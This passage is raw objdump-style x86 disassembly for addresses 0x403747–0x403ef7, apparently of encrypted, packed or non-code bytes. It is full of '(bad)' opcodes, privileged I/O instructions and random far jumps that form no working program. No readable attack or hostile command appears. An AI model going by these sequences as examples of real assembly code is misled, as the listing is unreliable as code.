  403747:	mov    bh,0x81
  403749:	das    
  40374a:	adc    ecx,ebp
  40374c:	mov    dh,0xa9
  40374e:	pop    edi
  40374f:	sub    bh,BYTE PTR [ebp-0x4a]
  403752:	enter  0x3e99,0xcf
  403756:	mov    ecx,0xc8029939
  40375b:	inc    edx
  40375c:	jae    0x4036e7
  40375e:	cmp    al,dh
  403760:	inc    esi
  403761:	lock int3 
  403763:	pop    edi
  403764:	inc    esi
  403765:	xor    BYTE PTR [ebp-0x5882ade4],0xca
  40376c:	pop    DWORD PTR [esi+0x33]
  40376f:	and    ch,dl
  403771:	inc    ecx
  403772:	clts   
  403774:	and    ebx,esi
  403776:	dec    edi
  403777:	pop    eax
  403778:	stc    
  403779:	adc    BYTE PTR [ebp+0x1a3bc013],cl
  40377f:	(bad)  
  403780:	leave  
  403781:	push   ss
  403782:	or     edi,edx
  403784:	dec    ebp
  403785:	xchg   esp,eax
  403786:	push   esp
  403787:	arpl   WORD PTR [ebx+0xe],di
  40378a:	push   eax
  40378b:	ror    DWORD PTR [ecx],1
  40378d:	xchg   ecx,eax
  40378e:	jb     0x4037d4
  403790:	adc    esi,ebp
  403792:	das    
  403793:	repz gs jno 0x4037c1
  403797:	xchg   ecx,eax
  403798:	rol    DWORD PTR [edx+0x3],0x5e
  40379c:	dec    ebx
  40379d:	dec    edx
  40379e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40379f:	dec    ebp
  4037a0:	mov    ch,0x33
  4037a2:	fdivr  DWORD PTR ds:0xbe10bed0
  4037a8:	scas   al,BYTE PTR es:[edi]
  4037a9:	and    esp,ecx
  4037ab:	sti    
  4037ac:	sub    bl,al
  4037ae:	sub    BYTE PTR [eax],0x58
  4037b1:	jmp    0x4037ff
  4037b3:	out    0x16,al
  4037b5:	dec    ecx
  4037b6:	push   es
  4037b7:	outs   dx,BYTE PTR ds:[esi]
  4037b8:	adc    al,0x68
  4037ba:	mov    ch,0xb9
  4037bc:	cmp    eax,0x8c467152
  4037c1:	xchg   esp,eax
  4037c2:	push   ebx
  4037c3:	xor    al,0xa3
  4037c5:	imul   ebp,DWORD PTR [ebp-0x45],0x9ff603ff
  4037cc:	xor    BYTE PTR [esp+edi*1+0x7e],bl
  4037d0:	shl    DWORD PTR [edi-0x7baf248c],cl
  4037d6:	push   eax
  4037d7:	mov    ebx,0x75cee5bf
  4037dc:	cmp    BYTE PTR [edx],ch
  4037de:	es (bad) 
  4037e1:	sbb    DWORD PTR [ebx-0x64],ecx
  4037e4:	ret    
  4037e5:	out    dx,al
  4037e6:	daa    
  4037e7:	mov    ds:0x5eacc3c9,al
  4037ec:	adc    bh,BYTE PTR ds:0x6703cc08
  4037f2:	adc    ebx,edi
  4037f4:	or     ecx,DWORD PTR [eax-0x28]
  4037f7:	cmp    BYTE PTR [edx-0x51],cl
  4037fa:	stos   BYTE PTR es:[edi],al
  4037fb:	xchg   BYTE PTR [ebx-0x4c8abb9b],al
  403801:	repz lds edi,FWORD PTR [ebx]
  403804:	sbb    BYTE PTR [ebx],ah
  403806:	sub    al,0x3b
  403808:	mov    ebp,0x31e9586b
  40380d:	fwait
  40380e:	es xchg edi,eax
  403810:	mov    bh,0xdf
  403812:	jae    0x403820
  403814:	clc    
  403815:	cmp    al,al
  403817:	mov    edi,0x49b3b69d
  40381c:	xor    BYTE PTR [edx+0x4b],al
  40381f:	cli    
  403820:	sbb    DWORD PTR [eax-0x78968a3d],esi
  403826:	out    dx,al
  403827:	push   ecx
  403828:	dec    esi
  403829:	dec    edx
  40382a:	pop    ebx
  40382b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40382c:	je     0x403822
  40382e:	sahf   
  40382f:	push   esp
  403830:	es push 0xfc24f49e
  403836:	call   0xcadf:0x5d724050
  40383d:	int    0xb7
  40383f:	add    ch,BYTE PTR ds:0x321aafd7
  403845:	jns    0x403804
  403847:	sbb    esi,DWORD PTR [edx-0x3f]
  40384a:	fs ins DWORD PTR es:[edi],dx
  40384c:	or     ebx,esp
  40384e:	fisttp QWORD PTR [ebx+0x6a66d6d4]
  403854:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403855:	fnstenv [esi]
  403857:	outs   dx,BYTE PTR ds:[esi]
  403858:	xchg   esi,eax
  403859:	iret   
  40385a:	jl     0x403866
  40385c:	lods   al,BYTE PTR ds:[esi]
  40385d:	repnz pop ss
  40385f:	in     al,dx
  403860:	pop    esi
  403861:	push   0x7799ba4e
  403866:	in     al,0xa8
  403868:	ja     0x403863
  40386a:	cs aam 0x21
  40386d:	push   esp
  40386e:	mov    dl,BYTE PTR [ebx]
  403870:	mov    esp,0xd5adf557
  403875:	mov    ss,WORD PTR ds:0x9fbb53f6
  40387b:	outs   dx,DWORD PTR ds:[esi]
  40387c:	pop    ecx
  40387d:	fsubr  st,st(4)
  40387f:	push   eax
  403880:	ins    BYTE PTR es:[edi],dx
  403881:	pop    esi
  403882:	stc    
  403883:	test   DWORD PTR [edx-0xf],esi
  403886:	ins    BYTE PTR es:[edi],dx
  403887:	into   
  403888:	sbb    bl,dl
  40388a:	or     al,0x71
  40388d:	imul   esi,eax,0x14
  403890:	jg     0x40388a
  403892:	icebp  
  403893:	mov    dl,bh
  403895:	test   DWORD PTR [eax],0xf5da9a61
  40389b:	mov    al,ds:0xcc6e04b7
  4038a0:	js     0x403841
  4038a2:	dec    edi
  4038a3:	stos   DWORD PTR es:[edi],eax
  4038a4:	dec    eax
  4038a5:	add    bh,BYTE PTR [edx+0x3d3f0755]
  4038ab:	dec    esp
  4038ac:	mov    edx,0xb772a703
  4038b1:	xchg   esi,eax
  4038b2:	call   0xc61:0x33efa8d8
  4038b9:	cmp    BYTE PTR [edi+0x59],cl
  4038bc:	sbb    eax,0xcb6eacc4
  4038c1:	(bad)  
  4038c2:	call   FWORD PTR [edx-0x5358846]
  4038c8:	mov    ebx,0xfeb0ea71
  4038cd:	pop    ds
  4038ce:	pop    eax
  4038cf:	test   DWORD PTR [edi+0x67],0x6ff1f7a7
  4038d6:	cmp    BYTE PTR [edi+0x3b8ea624],bh
  4038dc:	lea    ecx,ds:0x1495b183
  4038e2:	test   al,0x9c
  4038e4:	daa    
  4038e5:	pop    edx
  4038e6:	imul   eax,edx,0x17
  4038e9:	cmc    
  4038ea:	or     eax,0x72d2267f
  4038ef:	mov    dl,0x6f
  4038f1:	pause  
  4038f3:	(bad)  
  4038f4:	lahf   
  4038f5:	mov    gs,WORD PTR [ecx-0x144ee80c]
  4038fb:	clc    
  4038fc:	pop    es
  4038fd:	call   0xfeca:0xcb98e9ee
  403904:	pop    DWORD PTR [esp+edx*2-0x1c2439fc]
  40390b:	xlat   BYTE PTR ds:[ebx]
  40390c:	(bad)  
  40390d:	cmp    al,0xae
  40390f:	xor    edx,DWORD PTR cs:[esi]
  403912:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403913:	and    al,0xb3
  403915:	xor    eax,0xcec57ff9
  40391a:	es jnp 0x403926
  40391d:	frndint 
  40391f:	push   ebx
  403920:	mov    ebp,0x3ea2e15e
  403925:	xor    eax,esi
  403927:	mov    ebx,0xa1b1ac5c
  40392c:	cmp    dh,bh
  40392e:	lea    edi,[edx+0x1e]
  403931:	or     edi,DWORD PTR [edx-0xb2a19d6]
  403937:	jmp    FWORD PTR ds:0x7d6c1cdd
  40393d:	lea    esp,[edx+0x51]
  403940:	cs test eax,0x5066f4bf
  403946:	imul   edi,DWORD PTR [edx-0x56],0x28
  40394a:	sub    eax,DWORD PTR [ebx-0x37720b5f]
  403950:	mov    ch,BYTE PTR [edx+esi*4-0x36]
  403954:	fwait
  403955:	mov    dl,0x89
  403957:	inc    eax
  403958:	test   al,0x8b
  40395a:	jecxz  0x40396f
  40395c:	test   al,0xc
  40395e:	cmp    esi,DWORD PTR [ecx+0x1479b515]
  403964:	pop    ds
  403965:	cli    
  403966:	xor    eax,0xa8f60ea2
  40396b:	not    BYTE PTR [edx]
  40396d:	inc    edi
  40396e:	inc    edi
  40396f:	in     eax,dx
  403970:	pop    edx
  403971:	ins    DWORD PTR es:[edi],dx
  403972:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403973:	ror    bl,cl
  403975:	popa   
  403976:	ror    DWORD PTR [eax+0x54],0xe3
  40397a:	push   ebx
  40397b:	lock call 0xa342:0x12d3655c
  403983:	inc    esi
  403984:	add    eax,0x47bb2383
  403989:	add    eax,0xc5b90032
  40398e:	push   edx
  40398f:	nop
  403990:	(bad)  
  403991:	jmp    0x4039f4
  403993:	sbb    DWORD PTR [esi],esi
  403995:	(bad)  
  403996:	xor    ecx,eax
  403998:	aaa    
  403999:	jnp    0x4039fc
  40399b:	nop
  40399c:	pushf  
  40399d:	mov    esp,0x1088474
  4039a2:	pop    ss
  4039a3:	out    dx,eax
  4039a4:	idiv   edi
  4039a6:	loop   0x4039d0
  4039a8:	lock add al,0x6d
  4039ab:	popa   
  4039ac:	mov    fs,WORD PTR [ecx]
  4039ae:	adc    ebp,DWORD PTR [edx+0x71]
  4039b1:	pop    edi
  4039b2:	fbstp  TBYTE PTR [edi]
  4039b4:	mov    ch,0x48
  4039b6:	jnp    0x4039a1
  4039b8:	pusha  
  4039b9:	mov    edi,0xb468bb50
  4039be:	test   al,0xfd
  4039c0:	ins    DWORD PTR es:[edi],dx
  4039c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4039c2:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4039c4:	xchg   ecx,eax
  4039c5:	enter  0x1c23,0x2b
  4039c9:	fcmovb st,st(0)
  4039cb:	or     eax,0xb56af0d7
  4039d0:	mov    al,ds:0xcf4442e2
  4039d5:	das    
  4039d6:	hlt    
  4039d7:	cs pusha 
  4039d9:	mov    ds:0x6d6e7d74,al
  4039de:	leave  
  4039df:	mov    esp,0xe909bf00
  4039e4:	leave  
  4039e5:	push   cs
  4039e6:	pop    ds
  4039e7:	shl    DWORD PTR [ebp-0x46],0xb4
  4039eb:	jo     0x403a6a
  4039ed:	lods   eax,DWORD PTR ds:[esi]
  4039ee:	jl     0x4039e2
  4039f0:	jb     0x40397b
  4039f2:	jle    0x403a3d
  4039f4:	jg     0x4039b2
  4039f6:	neg    BYTE PTR [edi+0x5c1ebc48]
  4039fc:	cdq    
  4039fd:	(bad)  
  4039fe:	xchg   ebx,eax
  4039ff:	jae    0x4039aa
  403a01:	push   ebp
  403a02:	cmp    ch,BYTE PTR [edx]
  403a04:	sbb    BYTE PTR [ecx+0x7d],0x8f
  403a08:	ret    
  403a09:	pusha  
  403a0a:	fist   WORD PTR [edi]
  403a0c:	and    DWORD PTR [ecx],edi
  403a0e:	lahf   
  403a0f:	enter  0x514d,0x1d
  403a13:	xor    eax,0xdfa1630
  403a18:	into   
  403a19:	loop   0x403a13
  403a1b:	and    ecx,DWORD PTR [edx-0x116e42b0]
  403a21:	leave  
  403a22:	sbb    al,BYTE PTR [ebx]
  403a24:	jne    0x403aa5
  403a26:	test   DWORD PTR [eax+0x14],0xacc49994
  403a2d:	mov    ebx,0x6e7ee910
  403a32:	inc    ecx
  403a33:	adc    BYTE PTR [ebp+0x4c013218],cl
  403a39:	arpl   WORD PTR ds:[ebx-0x3f],bp
  403a3d:	sub    eax,DWORD PTR [bx]
  403a40:	jmp    DWORD PTR [edx+ecx*4-0x16c0ab9b]
  403a47:	fidiv  DWORD PTR [ebx+edx*1-0x17]
  403a4b:	mov    bl,0xd
  403a4d:	push   cs
  403a4e:	je     0x403a80
  403a50:	ins    BYTE PTR es:[edi],dx
  403a51:	dec    ebx
  403a52:	jl     0x4039d8
  403a54:	mov    esp,0xbd4ca3ad
  403a59:	leave  
  403a5a:	imul   eax,DWORD PTR [ecx-0x80],0x29
  403a5e:	clc    
  403a5f:	push   cs
  403a60:	sub    al,0xeb
  403a62:	icebp  
  403a63:	or     al,BYTE PTR [ecx-0x7d]
  403a66:	jae    0x403a20
  403a68:	push   ebx
  403a69:	popa   
  403a6a:	imul   DWORD PTR [edi+0x76]
  403a6d:	fmul   DWORD PTR [edi]
  403a6f:	test   al,0xef
  403a71:	push   eax
  403a72:	sysenter 
  403a74:	sub    ecx,DWORD PTR [ecx-0x6c]
  403a77:	push   0xffffff88
  403a79:	mov    ebx,0xc186cc96
  403a7e:	ss jns 0x403a01
  403a81:	gs pop ecx
  403a83:	xor    DWORD PTR [edx],esp
  403a85:	(bad)  
  403a86:	push   0x3f
  403a88:	int3   
  403a89:	enter  0x36cc,0x95
  403a8d:	and    BYTE PTR [edi+0x3],bl
  403a90:	pop    ds
  403a91:	scas   al,BYTE PTR es:[edi]
  403a92:	mov    bh,0x79
  403a94:	call   0x4a7c5271
  403a99:	sbb    eax,0x49aef25e
  403a9e:	fild   DWORD PTR [ebp+ecx*2+0x679ff847]
  403aa5:	add    DWORD PTR [edx+ebx*2+0x7a],0x32167d06
  403aad:	scas   eax,DWORD PTR es:[edi]
  403aae:	into   
  403aaf:	inc    ecx
  403ab0:	push   ebx
  403ab1:	xor    ecx,DWORD PTR [ebp+0x53]
  403ab4:	cmp    eax,0x78199e6f
  403ab9:	fisttp DWORD PTR [edx+0x2b0438d8]
  403abf:	xor    bh,BYTE PTR ds:0x7a6edb3d
  403ac5:	mov    al,ds:0x2b736f74
  403aca:	(bad)  
  403acb:	xchg   esi,eax
  403acc:	cmp    bl,bh
  403ace:	aam    0xd8
  403ad0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ad1:	popf   
  403ad2:	in     al,0xa9
  403ad4:	(bad)  
  403ad5:	pushf  
  403ad6:	and    esi,DWORD PTR [ecx-0x4]
  403ad9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ada:	or     BYTE PTR [ecx+ebx*8],al
  403add:	std    
  403ade:	sub    al,BYTE PTR [ecx]
  403ae0:	inc    esi
  403ae1:	dec    esp
  403ae2:	cli    
  403ae3:	int    0x5
  403ae5:	outs   dx,BYTE PTR ds:[esi]
  403ae6:	ins    BYTE PTR es:[edi],dx
  403ae7:	xor    esp,DWORD PTR [ebx]
  403ae9:	(bad)  [edx+0xf]
  403aec:	enter  0x4355,0x70
  403af0:	scas   al,BYTE PTR es:[edi]
  403af1:	mov    BYTE PTR [edx],0x4f
  403af4:	(bad)  
  403af5:	lock sti 
  403af7:	mov    ebx,0x48bd9382
  403afc:	add    DWORD PTR [edx+0x3b],ecx
  403aff:	je     0x403b39
  403b01:	leave  
  403b02:	push   esp
  403b03:	jmp    0x35a34e77
  403b08:	jmp    0x1d76734
  403b0d:	int    0x74
  403b0f:	xor    ch,BYTE PTR [ecx+0x1e]
  403b12:	lods   eax,DWORD PTR ds:[esi]
  403b13:	push   ebp
  403b14:	jle    0x403b14
  403b16:	enter  0x8ae1,0xde
  403b1a:	jmp    0x50a7:0x7f2c89ce
  403b21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b22:	jecxz  0x403ae4
  403b24:	stos   DWORD PTR es:[edi],eax
  403b25:	sub    al,0x29
  403b27:	jecxz  0x403abb
  403b29:	stos   BYTE PTR es:[edi],al
  403b2a:	sub    ebp,ebx
  403b2c:	iret   
  403b2d:	hlt    
  403b2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b2f:	cli    
  403b30:	jnp    0x403ae8
  403b32:	in     al,dx
  403b33:	(bad)  
  403b34:	pop    ebx
  403b35:	cmp    al,0x15
  403b37:	and    BYTE PTR [ebp-0xe4e168e],dl
  403b3d:	jnp    0x403b99
  403b3f:	inc    ecx
  403b40:	mov    esp,0x58c6a240
  403b45:	aam    0xfb
  403b47:	loop   0x403b80
  403b49:	xchg   ebp,eax
  403b4a:	stos   DWORD PTR es:[edi],eax
  403b4b:	shr    DWORD PTR [esi+0x5982fc50],cl
  403b51:	or     ebp,ebp
  403b53:	adc    bl,BYTE PTR [edi-0x13af7c9e]
  403b59:	mov    cs,WORD PTR [ecx]
  403b5b:	scas   eax,DWORD PTR es:[edi]
  403b5c:	pop    eax
  403b5d:	push   ebp
  403b5e:	cwde   
  403b5f:	pop    edx
  403b60:	mov    edx,0x827ce195
  403b65:	rcl    ah,0xcb
  403b68:	psubq  mm0,QWORD PTR [esi-0x1379b87c]
  403b6f:	jecxz  0x403be1
  403b71:	push   ecx
  403b72:	mov    esp,0xb422b421
  403b77:	test   BYTE PTR [edx-0x580fe1c8],dl
  403b7d:	nop
  403b7e:	sub    ecx,eax
  403b80:	out    dx,al
  403b81:	shl    esp,1
  403b83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b84:	shl    BYTE PTR [ebp+0x3821637d],0xe6
  403b8b:	add    DWORD PTR [esi],eax
  403b8d:	(bad)  
  403b8e:	ficomp WORD PTR [eax+0x9695832]
  403b94:	mov    edi,DWORD PTR [ecx+0x63d25f75]
  403b9a:	in     eax,dx
  403b9b:	jl     0x403c06
  403b9d:	mov    eax,ds:0x78627a88
  403ba2:	fwait
  403ba3:	repnz enter 0x1e0f,0xdf
  403ba8:	and    al,0xbc
  403baa:	pop    edi
  403bab:	mov    BYTE PTR [edx+0x3f],cl
  403bae:	cmp    al,0x48
  403bb0:	sahf   
  403bb1:	arpl   WORD PTR [ebx+0x3bbb3e98],si
  403bb7:	test   DWORD PTR [ebp+0x1c727c91],0x239570f9
  403bc1:	aaa    
  403bc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403bc3:	pusha  
  403bc4:	mov    DWORD PTR [ecx],ecx
  403bc6:	cs repnz ins DWORD PTR es:[edi],dx
  403bc9:	jns    0x403c00
  403bcb:	add    al,0x68
  403bcd:	push   edx
  403bce:	or     DWORD PTR [edx],esi
  403bd0:	jo     0x403c3f
  403bd2:	call   0x4881:0xdf564583
  403bd9:	mov    ah,0x69
  403bdb:	loope  0x403bf4
  403bdd:	add    dl,BYTE PTR [edx]
  403bdf:	push   esp
  403be0:	and    BYTE PTR [edx],0x5c
  403be3:	cwde   
  403be4:	in     eax,0xfe
  403be6:	test   ecx,eax
  403be8:	mov    ch,0xa3
  403bea:	sbb    edx,DWORD PTR [esi-0x3d]
  403bed:	aas    
  403bee:	mov    bl,0xc6
  403bf0:	fidiv  DWORD PTR [eax+edx*2-0x1d7316a8]
  403bf7:	jmp    0x403c2e
  403bf9:	fsub   DWORD PTR [ecx]
  403bfb:	pop    edx
  403bfc:	add    DWORD PTR [ebx+0x3e6c1c0b],ecx
  403c02:	pop    esi
  403c03:	(bad)  
  403c04:	mov    ebx,0x1763a111
  403c09:	jge    0x403c43
  403c0b:	stc    
  403c0c:	popa   
  403c0d:	or     ebx,DWORD PTR [edx-0x70c429e8]
  403c13:	nop
  403c14:	ret    
  403c15:	mov    ebp,0x8b54d0e1
  403c1a:	jns    0x403bcc
  403c1c:	push   edx
  403c1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c1e:	add    ebp,ebx
  403c20:	mov    bl,BYTE PTR [esi]
  403c22:	js     0x403c4b
  403c24:	xor    eax,0x6793e7ad
  403c29:	jge    0x403bb4
  403c2b:	xchg   ecx,eax
  403c2c:	sbb    ebp,DWORD PTR [eax]
  403c2e:	sub    esp,DWORD PTR [ebx+edi*2+0x77]
  403c32:	jmp    0xd827:0xc699767a
  403c39:	inc    edx
  403c3a:	es ss stos DWORD PTR es:[edi],eax
  403c3d:	ja     0x403c0a
  403c3f:	push   esi
  403c40:	nop
  403c41:	add    al,0x6e
  403c43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c44:	mov    cl,BYTE PTR [eax-0x13a9f871]
  403c4a:	and    DWORD PTR [ebx+0x74],edi
  403c4d:	bswap  ebp
  403c4f:	leave  
  403c50:	push   ebx
  403c51:	fidivr WORD PTR [edi-0x62]
  403c54:	imul   ebp,DWORD PTR [eax-0x154f4ff],0xb900e30
  403c5e:	pop    eax
  403c5f:	inc    ecx
  403c60:	cmp    eax,0xc1cda8b4
  403c65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c66:	mov    ds:0x68d5ef01,al
  403c6b:	(bad)  
  403c6c:	pop    ecx
  403c6d:	mov    dh,0x50
  403c6f:	iret   
  403c70:	test   ch,0xa0
  403c73:	pop    eax
  403c74:	scas   al,BYTE PTR es:[edi]
  403c75:	stos   BYTE PTR es:[edi],al
  403c76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c77:	aas    
  403c78:	sysexit 
  403c7a:	jecxz  0x403cc3
  403c7c:	ins    DWORD PTR es:[edi],dx
  403c7d:	or     BYTE PTR ds:0xc1e7c587,al
  403c83:	mov    ebp,0x4e0a49cd
  403c88:	mov    dh,0x44
  403c8a:	cmp    eax,0x67f2cb64
  403c8f:	icebp  
  403c90:	xor    edx,eax
  403c92:	dec    eax
  403c93:	mov    al,0xd0
  403c95:	push   edi
  403c96:	sub    BYTE PTR [ecx-0x72],ch
  403c99:	mov    BYTE PTR [edi+0x19602dcd],ah
  403c9f:	jmp    0xc73a4765
  403ca4:	xchg   esi,eax
  403ca5:	adc    BYTE PTR [ebp-0x23],0x2c
  403ca9:	jmp    0xd5e5:0x1286a4a5
  403cb0:	(bad)  
  403cb3:	push   ds
  403cb4:	lods   al,BYTE PTR ds:[esi]
  403cb5:	test   DWORD PTR [eax+0x75911239],0xa143a191
  403cbf:	push   ebp
  403cc0:	das    
  403cc1:	and    BYTE PTR [edi+0x75618515],dh
  403cc7:	cmp    al,0xdb
  403cc9:	fs mov bl,0xee
  403ccc:	add    BYTE PTR [edi-0x1b],dh
  403ccf:	xor    dh,BYTE PTR [edx-0x71]
  403cd2:	cdq    
  403cd3:	neg    DWORD PTR [ecx+0x67f1b0f0]
  403cd9:	jl     0x403d2a
  403cdb:	pop    esp
  403cdc:	mov    edx,0xe6ed83c3
  403ce1:	sub    al,0x39
  403ce3:	cmp    eax,0x470739a7
  403ce8:	mov    BYTE PTR [eax+edi*4-0x4016d5a5],ch
  403cef:	data16 loop 0x403c9e
  403cf2:	jo     0x403c75
  403cf4:	jmp    0xeddb9114
  403cf9:	jg     0x403d26
  403cfb:	jne    0x403d04
  403cfd:	xchg   cl,ah
  403cff:	into   
  403d00:	lss    edi,FWORD PTR [esi+esi*4-0x4f]
  403d05:	ret    0xe194
  403d08:	mov    ebx,DWORD PTR [ebp-0x54]
  403d0b:	and    al,0x8
  403d0d:	xor    eax,0xd70f16de
  403d12:	or     al,0x11
  403d14:	int3   
  403d15:	mov    dl,0x73
  403d17:	cmp    al,0x93
  403d19:	dec    esp
  403d1a:	push   cs
  403d1b:	push   ss
  403d1c:	xchg   edx,eax
  403d1d:	outs   dx,DWORD PTR ds:[esi]
  403d1e:	xor    DWORD PTR [eax+ecx*4+0x16],esp
  403d22:	mov    edi,0x13456395
  403d27:	add    DWORD PTR ds:0xdfdef101,ebp
  403d2d:	loop   0x403cdb
  403d2f:	sbb    edi,DWORD PTR [edx-0x103e0551]
  403d35:	xor    esp,DWORD PTR [esi-0x9]
  403d38:	mov    ds:0x52d035ab,al
  403d3d:	jle    0x403d99
  403d3f:	dec    ebp
  403d40:	fwait
  403d41:	xchg   edx,eax
  403d42:	pushf  
  403d43:	push   ss
  403d44:	push   ecx
  403d45:	inc    esp
  403d46:	add    DWORD PTR [ebx],edi
  403d48:	pop    ecx
  403d49:	and    ebp,DWORD PTR [bx]
  403d4c:	or     al,0x6e
  403d4e:	push   cs
  403d4f:	cmp    esi,DWORD PTR [ecx-0x26]
  403d52:	mov    esi,0x7ed5a294
  403d57:	inc    ebx
  403d58:	in     al,0x71
  403d5a:	and    bh,BYTE PTR [ebx+0x42]
  403d5d:	(bad)  
  403d5e:	cdq    
  403d5f:	push   ds
  403d60:	sbb    al,BYTE PTR [ebx+0x68]
  403d63:	or     BYTE PTR [edi+ebp*4],dl
  403d66:	in     al,0xe1
  403d68:	call   0xceb4:0x5d115693
  403d6f:	ret    0x9f2e
  403d72:	cwde   
  403d73:	pop    esi
  403d74:	in     al,dx
  403d75:	jecxz  0x403dd8
  403d77:	xchg   edx,eax
  403d78:	xchg   DWORD PTR [edx-0x26],edx
  403d7b:	loopne 0x403df3
  403d7d:	icebp  
  403d7e:	jno    0x403da2
  403d80:	mov    ebx,0x60e9dd0e
  403d85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d86:	ror    BYTE PTR [ecx+0x74],cl
  403d89:	push   esp
  403d8a:	cmp    al,0xd7
  403d8c:	sub    al,dl
  403d8e:	jg     0x403d84
  403d90:	jbe    0x403d7f
  403d92:	push   edx
  403d93:	xchg   esp,eax
  403d94:	(bad)  
  403d95:	xor    DWORD PTR [edi],edx
  403d97:	add    cl,BYTE PTR [eax+0x3da592ae]
  403d9d:	xchg   esi,eax
  403d9e:	jl     0x403d39
  403da0:	lock ret 0x1f39
  403da4:	jb     0x403dbc
  403da6:	test   BYTE PTR [ebx+edi*4+0x41],ah
  403daa:	cmp    al,0x75
  403dac:	xchg   ecx,eax
  403dad:	mov    ebp,DWORD PTR [edi+0x34]
  403db0:	cs pop edi
  403db2:	mov    ah,0x7d
  403db4:	dec    ecx
  403db5:	arpl   WORD PTR [esi-0x1a69a1b8],si
  403dbb:	out    dx,al
  403dbc:	push   ss
  403dbd:	mov    eax,ds:0xc7f6246f
  403dc2:	repz mov ebp,edx
  403dc5:	lock or ah,bl
  403dc8:	bound  ecx,QWORD PTR [edx-0x40]
  403dcb:	mov    BYTE PTR [esi+ecx*8+0x4a8150fa],ch
  403dd2:	call   0x2ae752c5
  403dd7:	popa   
  403dd8:	push   ebx
  403dd9:	add    DWORD PTR [ecx],0x6f
  403ddc:	or     DWORD PTR [esi+0x62],0xffffffb8
  403de0:	mov    esp,0x8e2f0e83
  403de5:	mov    ebx,0x819a282d
  403dea:	in     al,dx
  403deb:	and    eax,0x7c6b951d
  403df0:	cmc    
  403df1:	add    ebp,DWORD PTR [esp+esi*8+0x3d]
  403df5:	pop    ecx
  403df6:	fs addr16 ja 0x403e45
  403dfa:	mov    ds:0x5b5cfc3c,al
  403dff:	adc    esi,DWORD PTR [edx-0x1cdd662b]
  403e05:	adc    esp,DWORD PTR [ebp+ebp*2-0x4f9a24fd]
  403e0c:	lds    ecx,FWORD PTR [esi-0x74]
  403e0f:	inc    edi
  403e10:	push   esi
  403e11:	cmp    bl,BYTE PTR [edx]
  403e13:	xor    ecx,ebx
  403e15:	push   esi
  403e16:	pop    bx
  403e18:	xor    edx,eax
  403e1a:	jp     0x403e22
  403e1c:	inc    ebx
  403e1d:	dec    ecx
  403e1e:	retf   
  403e1f:	les    edi,FWORD PTR ds:0x378896e3
  403e25:	dec    edx
  403e26:	adc    al,0x1f
  403e28:	enter  0xaa07,0x7a
  403e2c:	mov    eax,ds:0xaab28eab
  403e31:	cmp    al,BYTE PTR [ebp-0x1c]
  403e34:	je     0x403ea0
  403e36:	jae    0x403dcb
  403e38:	pop    es
  403e39:	into   
  403e3a:	test   al,0x72
  403e3c:	imul   esp,DWORD PTR [edx-0x7c],0xffffffa4
  403e40:	pop    edx
  403e41:	fcomp  st(0)
  403e43:	or     al,BYTE PTR [ebx]
  403e45:	add    al,0xbf
  403e47:	xlat   BYTE PTR ds:[ebx]
  403e48:	cmp    edi,DWORD PTR [eax-0x4144dca9]
  403e4e:	jb     0x403eb6
  403e50:	mov    ebp,DWORD PTR [eax-0x7cd768c1]
  403e56:	sub    ah,BYTE PTR [esi-0x641dbc8d]
  403e5c:	(bad)  
  403e5d:	fldenv [ebx]
  403e5f:	sti    
  403e60:	and    al,0x62
  403e62:	or     esp,ebp
  403e64:	pushf  
  403e65:	mov    WORD PTR [ecx+edx*2-0x59cb285b],cs
  403e6c:	mov    edi,0x898608c5
  403e71:	add    ch,ch
  403e73:	xchg   esp,eax
  403e74:	les    esp,FWORD PTR [edi-0x2a]
  403e77:	shl    DWORD PTR [edi+eax*2-0x71],1
  403e7b:	test   bh,bl
  403e7d:	aad    0xf7
  403e7f:	daa    
  403e80:	jg     0x403eaa
  403e82:	and    BYTE PTR [ebx+edx*1],0xed
  403e86:	or     edx,esp
  403e88:	inc    ecx
  403e89:	retf   0x5115
  403e8c:	dec    ebx
  403e8d:	mov    cl,al
  403e8f:	mov    ds:0x576893b2,eax
  403e94:	mov    bl,BYTE PTR [ecx+0x6f]
  403e97:	ds into 
  403e99:	scas   al,BYTE PTR es:[edi]
  403e9a:	push   ecx
  403e9b:	pop    eax
  403e9c:	gs jns 0x403ec6
  403e9f:	rcl    DWORD PTR [edx+ebx*4],0xcc
  403ea3:	or     eax,0x761e7f62
  403ea8:	pop    esp
  403ea9:	push   ebx
  403eaa:	ja     0x403ebe
  403eac:	popf   
  403ead:	pop    ebp
  403eae:	jmp    0x512d6277
  403eb3:	mov    ecx,0x8b7465bd
  403eb8:	mov    ecx,0x61dafec4
  403ebd:	sub    al,0xfa
  403ebf:	inc    ecx
  403ec0:	addr16 daa 
  403ec2:	out    dx,al
  403ec3:	adc    ecx,DWORD PTR [esi+0x22548b17]
  403ec9:	inc    esi
  403eca:	imul   edx,DWORD PTR [edx],0x20e54bec
  403ed0:	div    edi
  403ed2:	pop    ebp
  403ed3:	iret   
  403ed4:	mov    ds:0xe26e2b60,al
  403ed9:	jae    0x403eee
  403edb:	sbb    dh,BYTE PTR [edi+0x7fc2fec6]
  403ee1:	std    
  403ee2:	xchg   esi,eax
  403ee3:	inc    ebp
  403ee4:	adc    DWORD PTR [edi-0x4f6e6e88],esi
  403eea:	mov    ebx,0x34e587d
  403eef:	mov    DWORD PTR [edi+0x46],esp
  403ef2:	cld    
  403ef3:	xor    BYTE PTR [ebp-0x30],ah
  403ef6:	push   ss
  403ef7:	icebp  
